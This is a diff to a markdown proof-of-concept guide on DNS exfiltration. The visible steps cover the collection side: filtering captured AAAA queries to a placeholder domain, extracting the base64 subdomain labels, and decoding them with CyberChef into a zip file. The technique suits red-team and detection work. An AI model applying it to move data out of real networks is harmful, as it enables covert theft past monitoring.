@@ -17,9 +17,8 @@ Reference: https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simpl
 
 # Review and Re-assemble Data
 
-1. On the server cat "dns_poc.txt"
-2. Select all "AAAA" request lines with: ``` cat dns_poc.txt | grep -E ';.*AAAA|AAAA.*;' | uniq ```
-3. Example output:
+1. Select all "AAAA" request lines with: ``` cat dns_poc.txt | grep -E ';.*AAAA|AAAA.*;' | uniq ```
+2. Example output:
 ```
 ;UEsDBBQAAAAIAKZoaVelbekKYQEAAAEC.sub.yourdomain.com IN      A
 ;UEsDBBQAAAAIAKZoaVelbekKYQEAAAEC.sub.yourdomain.com IN      AAAA
@@ -53,7 +52,7 @@ Reference: https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simpl
 ;iFVJNxPaAbuIVUk3E9oBzHgqlywT2gFQ.sub.yourdomain.com IN      AAAA
 ;SwUGAAAAAAEAAQBZAAAAhgEAAAAA.sub.yourdomain.com IN      A
 ```
-4. Filter results and extract unique "AAAA" record queries (you may need the last trailing "A" record query if there is no associated "AAAA" record with the same query)
+3. Filter results and extract unique "AAAA" record queries (you may need the last trailing "A" record query if there is no associated "AAAA" record with the same query)
  ```
 ;UEsDBBQAAAAIAKZoaVelbekKYQEAAAEC.sub.yourdomain.com IN      AAAA
 ;AAAHAAAAcG9jLmNzdkWQzW6DMBCE70i8.sub.yourdomain.com IN      AAAA
@@ -77,7 +76,7 @@ Reference: https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simpl
 ;iFVJNxPaAbuIVUk3E9oBzHgqlywT2gFQ.sub.yourdomain.com IN      AAAA
 ;SwUGAAAAAAEAAQBZAAAAhgEAAAAA.sub.yourdomain.com IN      A
 ```
-5. Parsing the results down further, we get the raw URL Safe Base64
+4. Parsing the results down further, we get the raw URL Safe Base64
 ```
 UEsDBBQAAAAIAKZoaVelbekKYQEAAAEC
 AAAHAAAAcG9jLmNzdkWQzW6DMBCE70i8
@@ -101,8 +100,8 @@ AAAAAHBvYy5jc3YKACAAAAAAAAEAGAC7
 iFVJNxPaAbuIVUk3E9oBzHgqlywT2gFQ
 SwUGAAAAAAEAAQBZAAAAhgEAAAAA
 ```
-6. Feed that into CyberChef with the following recipe: From Base64 (URL Safe Alphabet, Remove Non-Alphabet Characters), Unzip:
+5. Feed that into CyberChef with the following recipe: From Base64 (URL Safe Alphabet, Remove Non-Alphabet Characters), Unzip:
 ```
 https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true,false)Unzip('',false)&input=VUVzREJCUUFBQUFJQUtab2FWZWxiZWtLWVFFQUFBRUMNCkFBQUhBQUFBY0c5akxtTnpka1dRelc2RE1CQ0U3MGk4DQpneDlndDdJeFlIT3JCZTZmRW9oQy1udXpHa3RCQlZNQg0KcWRTM3ItT202Y0hTakhmMGVjYzMzVFF2dFJrc3JNeFoNCjZNRjBQV3dPbzdPZzl2dkp6ak9VM2ZJTjdXSVdDMl9kDQpaem51TFpUajBTMlR2MjNyT0tyc1YtZE9nVU52dnlFNA0KUEx2cnpfSDk2bjBjZ0ZPT01wTW9DaUdCSlp5c1RlZEkNCnVfaTQtN0lUbEJRa3BTeUZ4MVpCeGpJVUVoT2VKSEcwDQpNUXM4ZGM3TzRCVUdkYUVtVkdBaEJlWlp5aUhOY3FMNw0KNFFSOTd0ei1ZQVpZYTZBcHpaTkE1WVZBeGpEbnFZaWoNCkJ6T1BEdlN4OTI4SGpVRmZ5QmxMTU9QU0gxcUFrQVZwDQp6TWVKckk3ejRzdnVYa0J3VGxrQXB4NU1DMlEwTC1Mbw0KdHJmTy1WV25EMDhPQm5fTl85SXNSYzVUWklXdnl5Z2oNCkc5OHBmSVhwZXpNSGRrYl8yTktIYzVTYzVuRVVSMnExDQpJcFhhS2ZLc1dySlZkZFdzVjZfa1Z0ZDZxM2E2SXJzNw0KdmRYa3ZpVjFFMGRicmM1cF9iSnBXai0tcjMzQ1R5dTkNCmJralpQdjBBVUVzQkFoOEFGQUFBQUFnQXBtaHBWNlZ0DQo2UXBoQVFBQUFRSUFBQWNBSkFBQUFBQUFBQUFnQUFBQQ0KQUFBQUFIQnZZeTVqYzNZS0FDQUFBQUFBQUFFQUdBQzcNCmlGVkpOeFBhQWJ1SVZVazNFOW9CekhncWx5d1QyZ0ZRDQpTd1VHQUFBQUFBRUFBUUJaQUFBQWhnRUFBQUFB
 ```
-7. Review the unzipped "poc.csv" file from within "poc.zip"
+6. Review the unzipped "poc.csv" file from within "poc.zip"
